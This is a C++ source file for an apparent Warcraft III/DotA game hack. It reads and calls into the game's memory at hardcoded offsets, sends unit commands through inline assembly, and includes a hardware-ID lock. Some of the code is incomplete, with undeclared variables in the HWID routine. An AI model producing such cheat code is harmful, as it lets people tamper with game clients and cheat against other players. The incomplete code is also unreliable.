#define _WIN32_WINNT 0x0501 
#define WINVER 0x0501 
#define NTDDI_VERSION 0x05010000
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <vector>
#include <sstream>
using namespace std;


#include "sha256.h"

std::string PASTEHWIDHERE = std::string( "70d864467ae96299a1502f83d99dcc24b88e177fe4f824267d758cfb58cf626491" );


#define IsGameEndThenRestart if (!IsGame()) goto restartgame
#define IsGameEndThenExit if (!IsGame()) return

std::string GetHWID( )
{
	std::stringstream ss;
	char CPUString[ 0x20 ];
	char CPUBrandString[ 0x40 ];
	int CPUInfo[ 4 ] = { -1 };
	int nSteppingID = 0;
	int nModel = 0;
	int nFamily = 0;
	int nProcessorType = 0;
	int nExtendedmodel = 0;
	int nExtendedfamily = 0;
	int nBrandIndex = 0;
	int nCLFLUSHcachelinesize = 0;
	int nLogicalProcessors = 0;
	int nFeatureInfo = 0;
	int nCacheLineSize = 0;
	int nL2Associativity = 0;
	int nCacheSizeK = 0;
	int nVirtualAddress = 0;
	int nRet = 0;

	int nCores = 0;
	int nCacheType = 0;
	int nCacheLevel = 0;
	int nMaxThread = 0;
	int nSysLineSize = 0;

	int nWaysAssociativity = 0;
	int nNumberSets = 0;

	unsigned    nIds , nExIds , i;

	BOOL    bSSE3Instructions = FALSE;
	BOOL    bMONITOR_MWAIT = FALSE;
	BOOL    bCPLQualifiedDebugStore = FALSE;
	BOOL    bVirtualMachineExtensions = FALSE;
	BOOL    bEnhancedIntelSpeedStepTechnology = FALSE;
	BOOL    bThermalMonitor2 = FALSE;
	BOOL    bSupplementalSSE3 = FALSE;
	BOOL    bL1ContextID = FALSE;
	BOOL    bCMPXCHG16B = FALSE;
	BOOL    bxTPRUpdateControl = FALSE;

			ss << nSteppingID << nModel << nFamily << nProcessorType << nExtendedmodel
				<< nExtendedfamily << nBrandIndex << nCLFLUSHcachelinesize << nLogicalProcessors
				<< bSSE3Instructions << bMONITOR_MWAIT << bCPLQualifiedDebugStore
				<< bVirtualMachineExtensions << bEnhancedIntelSpeedStepTechnology << bThermalMonitor2
				<< bSupplementalSSE3 << bL1ContextID << bCMPXCHG16B << bxTPRUpdateControl
				<< bPerfDebugCapabilityMSR << bSSE41Extensions << bSSE42Extensions << bPOPCNT
				<< nFeatureInfo << bMultithreading;

			MEMORYSTATUSEX statex;

			statex.dwLength = sizeof ( statex );

			GlobalMemoryStatusEx( &statex );
			ss << statex.ullTotalPhys;

	SHA256 sha256;
	return sha256( ss.str( ) );
}

#define IsKeyPressed(CODE) (GetAsyncKeyState(CODE) & 0x8000) > 0

typedef void *( __fastcall * GetBtnAddrGAME )( char * a2 , int  INDEX );
GetBtnAddrGAME GetBtnAddr_p;

BOOL initializedgamedll = FALSE;

int GameDll = 0;

UINT gamecache = 0;

BOOL ingame = FALSE;


HANDLE thr1;


HANDLE thr2;


BOOL IsLagScreen( )
{
	return GetBtnAddr_p( "SuspendDropPlayersButton" , 0 ) > 0;
}

BOOL IsGame( ) // my offset + public
{
	return *( int* ) ( ( UINT32 ) GameDll + 0xACF678 ) > 0 || *( int* ) ( ( UINT32 ) GameDll + 0xAB62A4 ) > 0;
}




#pragma region PureHackCode


int GetGameGlobalClassAddr( )
{
	return *( int* ) ( 0xAB4F80 + GameDll );
}

int GetGlobalPlayerData( )
{
	return *( int* ) ( 0xAB65F4 + GameDll );
}

int GetLocalPlayerNumber( )
{
	return ( int ) *( unsigned short * ) ( GetGlobalPlayerData( ) + 0x28 );
}

UINT32 GetPlayerByNumber( int number )
{
	return *( ( DWORD * ) GetGlobalPlayerData() + number + 22);
	//return GetGlobalPlayerData( ) + number * 4 + 0x58;
}

UINT32 GetLocalPlayer( )
{
	return GetPlayerByNumber( GetLocalPlayerNumber( ) );
}

int Get6FAB7788( )
{
	return *( int* ) ( GameDll + 0xAB7788 );
}



signed int __fastcall sub_6F03FA30( unsigned int a1 , int a2 )
{
	BOOL v2; // zf@3
	signed int result; // eax@7
	int v4; // ecx@9
	int v5; // ecx@10

	if ( !( a1 >> 31 ) )
	{
		if ( a1 < *( UINT32 * ) ( Get6FAB7788( ) + 28 ) )
		{
			v2 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 12 ) + 8 * a1 ) == -2;
			goto LABEL_6;
		}
		return 0;
	}
	if ( ( a1 & 0x7FFFFFFF ) >= *( UINT32 * ) ( Get6FAB7788( ) + 60 ) )
		return 0;
	v2 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 44 ) + 8 * a1 ) == -2;
LABEL_6:
	if ( !v2 )
		return 0;
	if ( a1 >> 31 )
	{
		v4 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 44 ) + 8 * a1 + 4 );
		result = *( UINT32 * ) ( v4 + 24 ) != a2 ? 0 : v4;
	}
	else
	{
		v5 = *( UINT32 * ) ( *( UINT32 * ) ( Get6FAB7788( ) + 12 ) + 8 * a1 + 4 );
		result = *( UINT32 * ) ( v5 + 24 ) != a2 ? 0 : v5;
	}
	return result;
}

int __fastcall sub_6F473170( int a22 , int unused )
{
	return *( UINT32 * ) ( sub_6F03FA30( *( UINT32 * ) ( a22 + 8 ) , *( UINT32 * ) ( a22 + 12 ) ) + 120 );
}

typedef int( __fastcall * psub_6F41B420 )( int , int );
psub_6F41B420 sub_6F41B420;


/*
int __thiscall sub_6F3A1650( void *this , int a2 )
{
return *( ( _UINT32 * )this + a2 + 22 );
}

*/


struct Unit
{
	DWORD dwDummy[ 3 ];
	DWORD dwID1;
	DWORD dwID2;
	BYTE _1[ 0x1C ];
	DWORD dwClassId;
	BYTE _2[ 0x1C ];
	DWORD HealthBar;
	DWORD UNK;
	DWORD dwOwnerSlot;
};

DWORD GetUnitOwningPlayer( Unit* unit )
{
	DWORD num = unit->dwOwnerSlot;
	return GetPlayerByNumber( num );
}



Unit* GetSelectedAnyUnit( )
{
	DWORD plr = GetLocalPlayer( );
	DWORD rt;
	__asm
	{
		MOV EAX , plr;
		MOV ECX , DWORD PTR DS : [ EAX + 0x34 ];
		MOV EAX , DWORD PTR DS : [ ECX + 0x1E0 ];
		MOV rt , EAX;
	}
	return ( Unit* ) rt;
}

void SendMoveAttackCommand( float X , float Y, DWORD cmdId = 0xD0003 )
{
	int globalclass = GetGameGlobalClassAddr( );
	int _MoveAttackCmd = 0x339DD0 + GameDll;
	__asm
	{
		PUSH 0
			PUSH 6
			PUSH 0
			MOV ECX , globalclass
			MOV ECX , DWORD PTR DS : [ ECX + 0x1B4 ];
		PUSH Y
			PUSH X
			PUSH 0
			PUSH cmdId
			CALL _MoveAttackCmd
	}

}


Unit* GetSelectedOwnedUnit( )
{
	
	UINT32 plr = GetLocalPlayer( );
	UINT32 rt;
	Unit* returnunit;
	
	__asm
	{
		MOV EAX , plr;
		MOV ECX , DWORD PTR DS : [ EAX + 0x34 ];
		MOV EAX , DWORD PTR DS : [ ECX + 0x1E0 ];
		MOV rt , EAX;
	}
	
	returnunit = ( Unit* ) rt;
	
	if ( rt )
	{
		if ( returnunit->dwOwnerSlot == GetLocalPlayerNumber( ) )
		{
			return ( Unit* ) rt;
		}
	}

	return NULL;
}


#pragma endregion





void TextPrint( char *szText , float fDuration )
{
	UINT32 dwDuration = *( ( UINT32 * ) &fDuration );
	UINT32 GAME_GlobalClass = GameDll + 0xAB4F80;
	UINT32 GAME_PrintToScreen = GameDll + 0x2F8E40;
	__asm
	{
		PUSH	0xFFFFFFFF
			PUSH	dwDuration
			PUSH	szText
			PUSH	0x0
			PUSH	0x0
			MOV		ECX , [ GAME_GlobalClass ]
			MOV		ECX , [ ECX ]
			CALL	GAME_PrintToScreen
	}
}

char * GetStringFromJSID( UINT32 JSID )
{
	UINT32 Convert = GameDll + 0x459640;
	UINT32 GetCurrentJassEnvironment = GameDll + 0x44B2E0;
	char * cRet;

	__asm
	{
		push JSID;
		mov ecx , 1;
		call GetCurrentJassEnvironment;
		mov ecx , eax;
		call Convert;
		mov ecx , DWORD ptr ds : [ eax + 0x08 ];
		mov eax , DWORD ptr ds : [ ecx + 0x1C ];
		mov cRet , eax;
	}

	return cRet;
}


struct JassStringData
{
	UINT32 vtable;
	UINT32 refCount;
	UINT32 dwUnk1;
	UINT32 pUnk2;
	UINT32 pUnk3;
	UINT32 pUnk4;
	UINT32 pUnk5;
	char *data;
};


struct JassString
{
	UINT32 vtable;
	UINT32 dw0;
	JassStringData *data;
	UINT32 dw1;
};


struct JassStringClearStruct
{
	JassString * jstring;
	int timer;
};


void GetJassString( char *szString , JassString *String )
{
	int Address = GameDll + 0x011300;


	__asm
	{
		PUSH szString;
		MOV ECX , String;
		CALL Address;
	}
}

struct ReadDotaInfoStruct
{
	int hero;     // 4
	int kills;       // 8
	int deaths;      // 12
	int assists;     // 16
	int creeps;      // 20
	int gold;        // 24
	int towers;      // 28
	int couriers;      // 32
	int item1;    // 36
	int item2;    // 40
	int item3;    // 44 
	int item4;    // 48
	int item5;    // 52
	int item6;    // 56
};

struct ActionStruct
{
	int actionid;
	int player1id;
	int player2id;
	int actiondata;
};


int Player( int id )
{
	switch ( id )
	{
		case 6:
			return 7;
		case 7:
			return 8;
		case 8:
			return 9;
		case 9:
			return 10;
		case 10:
			return 11;

		default:
			break;
	}

	return id;
}

JassString * fordetect;
JassString * jData;
JassString * jGlobal;
JassString * jWinner;
JassString * jM;
JassString * jS;
JassString * jThrone;
JassString * jTree;
JassString * jGameStart;

typedef void( __cdecl * pStoreInteger )( UINT cache , JassString *missionKey , JassString *key , int value );
pStoreInteger StoreInteger;

typedef void( __cdecl * pSyncStoredInteger )( UINT cache , JassString *missionKey , JassString *key );
pSyncStoredInteger SyncStoredInteger;

typedef int( __cdecl * pGetStoredInteger )( UINT cache , JassString *missionKey , JassString *key );
pGetStoredInteger GetStoredInteger;

typedef void( __cdecl * pClearTextMessages )( );
